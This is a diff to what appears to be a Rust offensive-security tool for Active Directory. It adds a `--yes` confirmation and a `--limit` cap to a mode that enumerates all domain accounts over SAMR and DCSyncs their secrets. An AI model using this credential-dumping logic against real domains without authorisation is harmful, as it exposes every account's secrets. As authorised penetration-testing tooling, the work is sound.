@@ -791,6 +791,15 @@ struct DcsyncArgs {
     /// Replicate ALL domain accounts (enumerate via SAMR, then DCSync each) — full secretsdump
     #[arg(long)]
     all: bool,
+    /// Confirm bulk (`--all`) runs non-interactively. Required when stdout is a TTY
+    /// and `--all` is set; ignored otherwise. Blocks accidental full-domain dumps from
+    /// a fat-fingered flag.
+    #[arg(long)]
+    yes: bool,
+    /// Cap the bulk (`--all`) run at N accounts. Useful for smoke-testing --all against a
+    /// large domain before committing to a full dump.
+    #[arg(long)]
+    limit: Option<usize>,
 }
 
 #[derive(Parser)]
@@ -1446,9 +1455,33 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
     smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
     let pipe = smb.open_pipe("samr").await?;
     let mut samr = SamrClient::bind(&mut smb, pipe).await?;
-    let users = samr.enumerate_all_users(&format!("\\\\{}", a.host)).await?;
+    let mut users = samr.enumerate_all_users(&format!("\\\\{}", a.host)).await?;
+
+    // Interactive-terminal safety gate. `--all` on a fat-fingered command dumps
+    // every account in the domain; require --yes when we can see the operator's
+    // TTY. Non-TTY callers (CI / piped runs) bypass the prompt.
+    use std::io::IsTerminal as _;
+    if !a.yes && std::io::stdout().is_terminal() {
+        anyhow::bail!(
+            "`--all` will DCSync {} accounts from {} in this domain. Re-run with --yes to \
+             confirm, or use --limit N for a scoped run first.",
+            users.len(),
+            a.host
+        );
+    }
+
+    if let Some(n) = a.limit {
+        if users.len() > n {
+            eprintln!(
+                "[*] --limit {n} — capping bulk run at {n} of {} enumerated accounts",
+                users.len()
+            );
+            users.truncate(n);
+        }
+    }
+
     eprintln!(
-        "[+] {} accounts enumerated; replicating secrets…",
+        "[+] {} accounts scheduled for replication…",
         users.len()
     );
 
